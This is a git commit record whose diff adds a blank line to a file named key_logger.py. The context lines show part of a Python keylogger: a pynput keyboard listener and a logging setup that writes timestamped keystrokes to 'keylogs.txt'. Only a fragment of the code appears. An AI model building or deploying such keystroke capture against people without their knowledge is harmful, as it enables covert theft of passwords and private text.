d4da548af2c2d6390d1aa2bb02193fe4e03be839
deeghayu <deefernando6@gmail.com>
2021-07-01 21:35:48 +0530

    Update key_logger.py

--- key_logger.py
+++ key_logger.py
@@ -2,6 +2,7 @@ from pynput.keyboard import Key, Listener
 import logging
 
 log_dir = ""
+
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def press(key):
